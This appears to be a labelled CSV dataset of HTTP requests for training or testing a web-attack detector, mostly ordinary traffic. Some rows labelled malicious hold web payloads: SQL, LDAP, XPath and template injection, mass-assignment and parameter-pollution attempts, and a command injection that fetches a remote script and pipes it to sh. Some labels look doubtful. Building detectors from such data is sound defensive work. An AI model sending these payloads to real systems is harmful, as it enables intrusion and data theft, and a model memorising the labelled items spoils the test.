label,text
benign,"POST /subscription/upgrade HTTP/1.1
Host: secure-user-portal.net
User-Agent: curl/7.79.1
Content-Type: application/json
Accept: */*
X-CSRF-Token: 8ef30a1bbc7d528f
Content-Length: 38
Connection: keep-alive

{""plan"":""ultra-premium-pro-max-v9""}"
benign,"PATCH /api/v1/settings HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/json-patch+json
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:92.0) Gecko/20100101 Firefox/92.0
Connection: keep-alive
Cookie: auth_token=gh234rGG5df!00383FGR2fdL2
Content-Length: 74

[{""op"":""replace"",""path"":""/editor/fontSize"",""value"":14},{""op"":""replace"",""path"":""/editor/theme"",""value"":""light""}]"
malicious,"PATCH /v1/accounts/profile HTTP/1.1
Host: online-retail-store.biz
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWJjMTIzIiwiZXhwIjoxNjgyOTE2MjAwfQ.44abJ7NCigCkRpQ7uVenQChV9NVtp1KTmLXSU7cxhNs
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36
Referer: https://online-retail-store.biz/account/settings
Accept-Language: en-US,en;q=0.8

{
  ""user_details"": {
    ""name"": ""attacker"",
    ""shipping_address"": ""1234 Forbidden Str""
  },
  ""account_info"": {
    ""subscription_level"": ""silver"",
    ""override_settings"": {
      ""credits_override"": 99999,
      ""is_feature_xyz_enabled"": true
    }
  }
}"
benign,"GET /images/2024/gallery/cover-photo.jpg HTTP/1.1
Host: media-streaming-services.tv
DNT: 1
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate
Connection: keep-alive
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)"
benign,"GET /furniture/living-room/sofas HTTP/1.1
Host: cabincozy-living.net
Connection: keep-alive
Accept: text/html
Accept-Language: en-US,en;q=0.8
Referer: https://cabincozy-living.net/furniture
Cookie: sess=7d9f84e52bca1234bc9f712d018a2d4c; cart=be9eadf01234
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-A725F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.64 Mobile Safari/537.36"
benign,"DELETE /api/v2/posts/abc-987-xz HTTP/1.1
Host: api.cloud-data-services.ai
Authorization: Bearer 2c88f91a-f733-4298-aba9-05c5f2a76c38
Accept: application/json, text/plain
Accept-Encoding: gzip, deflate, br
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Accept-Language: en-US,en;q=0.9"
benign,"POST /api/v1/media/uploads HTTP/1.1
Host: global-media-cloud.info
Connection: keep-alive
Content-Type: multipart/form-data; boundary=--XyZ12345boundary
Content-Length: 327
Accept: application/json
User-Agent: python-requests/2.28.1
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Cookie: user_sid=1f4d2f6897cb503a78512db6a21e9634

----XyZ12345boundary
Content-Disposition: form-data; name=""file""; filename=""welcome_message.txt""
Content-Type: text/plain

Welcome message to new users of the global media platform.
----XyZ12345boundary--"
malicious,"GET /page_render?message=%7B%7B%207*%277%27%7D%7D HTTP/1.1
Host: live-chat-widget.dev
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Cache-Control: max-age=0
Connection: keep-alive"
benign,"GET /user-profile/view/987654321 HTTP/1.1
Host: social-connections-network.co
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (iPad; CPU OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://social-connections-network.co/user-profile/search
Cookie: session=abcde12345fghij67890; theme=blue
Cache-Control: max-age=0
DNT: 1
Sec-CH-UA: ""Safari"";v=""15"", ""Not:A-Brand"";v=""99"", ""Chromium"";v=""114""
Sec-CH-UA-Mobile: ?1
Sec-CH-UA-Platform: ""iOS""
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document"
benign,"OPTIONS /v3/devices/88bc6/config HTTP/1.1
Host: iot-control-hub.io
Origin: https://deviceportal.smartautomation.co.uk
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: content-type, x-custom-header, x-api-key
User-Agent: curl/7.85.0
Accept: */*"
benign,"POST /api/v1/profile/update HTTP/1.1
Host: user-data-hub.net
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Connection: keep-alive
Content-Length: 89

{""username"": ""johndoe82"", ""email"": ""john.doe82@user-data-hub.net"", ""isAdmin"": false, ""preferences"": {""newsletter"": true}}"
benign,"POST /blog/article/321/comment HTTP/1.1
Host: eco-living-today.info
User-Agent: curl/7.85.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 91
Referer: https://eco-living-today.info/blog/article/321
Origin: https://eco-living-today.info
Cookie: user_session=9275a7b2f05c34e021a6d3739ad8912c
X-CSRF-Token: d873b9f12ec84ccb9d41547a6bf45101
Accept-Language: en-US,en;q=0.5
Connection: close

author_name=Oliver+White&comment_text=Love+the+sustainability+tips+here.+Thanks+for+posting!&parent_id="
benign,"PUT /api/v3/projects/40231/settings HTTP/1.1
Host: cloud-dev-portal.io
If-Match: ""34b2c7e1fa97d9""
Authorization: Bearer mF_9.B5f-4.1JqM
Content-Type: application/json
Accept: */*
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Length: 79

{""notifications"": {""email"": true, ""sms"": false}, ""autoSave"": true, ""theme"": ""dark""}"
malicious,"GET /blog/article/view?id=42 HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept-Encoding: gzip, deflate, br
Referer: http://referrer.my-personal-blog-site.info/{# {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('whoami').read() }} #}
Upgrade-Insecure-Requests: 1"
benign,"POST /orders/submit HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 195
Connection: keep-alive
Accept: text/html,application/xhtml+xml
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1
Referer: https://online-retail-store.biz/cart/view
Accept-Language: en-US,en;q=0.9

customer_id=458932&order_notes=%3Cnotes%3EDeliver+after+5pm%3C%2Fnotes%3E%3CgiftWrap%3Etrue%3C%2FgiftWrap%3E&payment_method=credit_card"
benign,"GET /api/xml/locations HTTP/1.1
Host: geo-mapping-platform.cloud
Accept: text/xml
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
Referer: https://dashboard.geo-mapping-platform.cloud/home
Connection: close"
malicious,"POST /user/query/filter HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Content-Type: application/json
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Content-Length: 94

{""searchFilter"": ""(title=moderator)(objectClass=person))(|(uid=administrator)""}"
benign,"POST /orders/new HTTP/1.1
Host: seamless-food-delivery.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 2050
User-Agent: curl/7.85.0
Accept: */*
Connection: close

customer_name=Clarissa+Jones&delivery_address=1234+Elm+Street%2C+Springfield%2C+IL+62704&order_items%5B0%5D%5Bitem_id%5D=7682&order_items%5B0%5D%5Bquantity%5D=2&order_items%5B1%5D%5Bitem_id%5D=1245&order_items%5B1%5D%5Bquantity%5D=1&special_instructions=Please+leave+the+order+at+the+front+door.+I+will+be+working+from+home.+Thank+you+for+the+great+service%21+I+am+really+looking+forward+to+the+meal.+Your+menu+has+become+a+regular+favorite+in+our+household."
malicious,"GET /lookup?user=%2A%29%28|(mail%3Dbaduser%40phish.com)%29 HTTP/1.1
Host: recon-directory.org
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Cache-Control: max-age=0
Connection: keep-alive"
benign,"GET /themes/dark-mode/style.css HTTP/1.1
Host: media-streaming-hub.io
Connection: keep-alive
Accept: text/css,*/*;q=0.1
Referer: https://media-streaming-hub.io/watch/series/season2
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
benign,"GET /favicon.ico HTTP/1.1
Host: global-sports-updates.info
Accept: image/x-icon,image/vnd.microsoft.icon,*/*;q=0.9
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Connection: close
Accept-Language: en-US"
benign,"GET /blog/cooking-basics/pasta-dough-tips HTTP/1.1
Host: culinary-artisan.info
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: https://culinary-artisan.info/blog/cooking-basics
Accept-Language: en-US,en;q=0.7
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1"
malicious,"POST /api/executeTask HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/json, text/javascript
Content-Type: application/json
Content-Length: 161
Cache-Control: max-age=0

{""task"":""generate_report"",""target_host"":""localhost || curl http://suspicious-scripts.secure-user-portal.net/exploit.sh | sh"",""parameters"":{""format"":""pdf""}}"
malicious,"POST /account/settings HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Content-Type: text/plain
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.9
Cookie: auth_id=fd89c8e2a0b14f1b9c7d8e2f5a31bc45
Content-Length: 86

user%5Bemail%5D=devmaster%40game-dev-forum.org&user%5Bprofile%5D%5Bverified%5D=true&user%5Broles%5D%5B%5D=2&user%5Broles%5D%5B%5D=4"
benign,"PUT /updates/profile/86 HTTP/1.1
Host: secure-membership-platform.cooptech.eu
Authorization: Bearer d29jdGZkanNmODU2YXZoYm5zZ2JhZWY4Y3Q4ZXZz
Origin: https://secure-membership-platform.cooptech.eu
X-Requested-With: XMLHttpRequest
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Content-Length: 90

{""address"":{""street"":""123 Maple Ave"",""city"":""Portland"",""postalCode"":""97209""},""preferences"":{""contactMethod"":""email""}}"
benign,"GET /fonts/ubuntu-mono-webfont.ttf HTTP/1.1
Host: dev-tools-portal.dev
Accept: application/font-ttf,*/*;q=0.75
Referer: https://dev-tools-portal.dev/css/editor.css
Origin: https://dev-tools-portal.dev
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.6"
malicious,"GET /browse/products?category=12%27%20UNION%20SELECT%20@@VERSION%2CSLEEP%285%29%2CUSER%28%29--%20 HTTP/1.1
Host: market.online-retail-store.biz
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Cookie: sid=2b39f61903cd19a729c5d38852b378e5; theme=dark"
benign,"GET /forum/thread/view/15937?msg=param=Hello%252520World HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cache-Control: max-age=0
Origin: https://community.game-dev-forum.org"
malicious,"POST /admin/panel/updateprefs HTTP/1.1
Host: enterprise-insight.ai
User-Agent: Python-urllib/3.9
Accept: application/json
Referer: https://enterprise-insight.ai/management/dashboard
Content-Type: application/json
Content-Length: 46
Cookie: session_cookie=XJsnf7ds8f7s8df7sdf7sd8f7

{""dashboardTheme"":""dark"",""enableBetaFeatures"":true}"
malicious,"POST /user/login HTTP/1.1
Host: craft-marketplace.co.uk
User-Agent: Python-urllib/3.9
Content-Type: application/x-www-form-urlencoded
Accept-Charset: utf-8, iso-8859-1;q=0.5
Accept-Language: en-GB,en;q=0.9
Content-Length: 90

loginname=daniel'+and+substring(concat(substring(//user[1]/creditcard,1,5),'ZZ'),3,1)%3D'4&passcode=password123"
benign,"GET /forum/thread/12345/page/2 HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Referer: https://stream-focus.net/live-events/123
Connection: keep-alive"
benign,"POST /api/comment/v2/submit HTTP/1.1
Host: innovation.tech-hub.cloud
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: application/json, text/javascript, */*; q=0.01
Content-Length: 107
Connection: keep-alive
X-Requested-With: XMLHttpRequest
Origin: https://innovation.tech-hub.cloud
Referer: https://innovation.tech-hub.cloud/dashboard
Cookie: auth_session=47ecf1f4e6286fc623768bb9e416a8e4

project_id=2099&user_id=52674&comment=VGhlIGxhdGVzdCBpbXBvcmVtZW50cyBmb3IgdGhlIGFwIiBtYWRlIGEgZ3JlYXQgc3RhcnMu"
benign,"GET /blog/articles/2023/04/feature-release HTTP/1.1
Host: techinsights-daily.ai
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
If-Modified-Since: Wed, 22 Mar 2023 10:45:00 GMT
Referer: https://techinsights-daily.ai/blog
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.8
Connection: keep-alive
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"
benign,"GET /news/world/asia HTTP/1.1
Host: global-insight-media.tv
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
DNT: 1
Connection: keep-alive"
benign,"GET /photos/events/concert-2023/header.avif HTTP/1.1
Host: urban-vibes-media.com
Accept: image/avif,image/webp,*/*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:113.0) Gecko/20100101 Firefox/113.0
Accept-Language: en-US
Connection: keep-alive
Cache-Control: max-age=3600"
benign,"POST /contact/submit HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/x-www-form-urlencoded
Content-Length: 393
Connection: keep-alive
User-Agent: python-requests/2.29.0
Accept: */*
Accept-Encoding: gzip, deflate, br

name=Gregory+Lang&email=gregory.lang%40mypersonalblog.info&subject=Collaboration+Inquiry&message=Hi+there%2C+I+enjoy+your+blog+a+lot+and+would+love+to+discuss+a+potential+collaboration.+Please+let+me+know+if+you%27re+interested.&website=https%3A%2F%2Fgregorysportfolio.com&newsletter_signup=yes&location=Denver%2C+CO&phone=+13035551234"
benign,"POST /api/v1/contact HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/xml
Content-Length: 114
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/xml, application/xml
Referer: https://community.game-dev-forum.org/help
Connection: keep-alive

<contact><name>Julian Marks</name><email>julian.marks@gdforums.org</email><message>Looking forward to the new dev toolkit release!</message></contact>"
benign,"GET /api/v1/items/filter?brand=acme&brand=globex&price_min=10&price_max=100&availability=in_stock HTTP/1.1
Host: api.tech-galaxy.ai
Accept: application/json
X-Requested-With: XMLHttpRequest
Origin: https://dashboard.tech-galaxy.ai
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Mobile Safari/537.36
Referer: https://dashboard.tech-galaxy.ai/items"
benign,"GET /store/products/search?category=books&sort_by=rating_desc&page=3 HTTP/1.1
Host: smartshopper-online.biz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Accept: text/html,application/xhtml+xml
Referer: https://smartshopper-online.biz/store/
Connection: keep-alive"
benign,"GET /resources/guides/annual_report_2023.pdf HTTP/1.1
Host: insight-data-hub.ai
Accept: application/pdf
Referer: https://insight-data-hub.ai/reports/overview
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Connection: keep-alive"
benign,"GET /v3/fetchMetadata?url=https%3A%2F%2Fdevtools.my-personal-blog-site.info%2Fpost%2Fdeploy-status HTTP/1.1
Host: api.my-personal-blog-site.info
Accept: application/json
User-Agent: Python-urllib/3.11
Connection: keep-alive
Accept-Encoding: identity"
benign,"POST /api/v1/tickets/789/update-status HTTP/1.1
Host: support.community.game-dev-forum.org
Content-Type: application/json
Accept: application/json
Origin: https://community.game-dev-forum.org
X-Requested-With: FetchAPIClient
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6ImFwcC1rZXkifQ.Zm9vYmFy.Xxkud3JkM5ZGReAsL9QKGVc
X-CSRF-Token: e52dc9e06a724e73a1a9b29196bb199c
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/112.0
Pragma: no-cache

{""ticketId"":789,""status"":""resolved"",""resolutionNotes"":""Issue fixed after patch deployment""}"
benign,"POST /api/v1/user/profile/update HTTP/1.1
Host: accounts.secure-user-portal.net
Connection: keep-alive
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Accept-Language: en-US,en;q=0.9
Content-Length: 88

{""fullName"":""Lisa Thompson"",""email"":""lisa.thompson47@secure-user-portal.net"",""notifications"":true}"
malicious,"POST /profile/edit HTTP/1.1
Host: user-portal-vz.io
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
Content-Length: 92
Connection: keep-alive
Referer: https://user-portal-vz.io/profile

user=standard&mode=edit&user=administrator&mode=delete&note=%3Cscript%3Exss()%3C%2Fscript%3E"
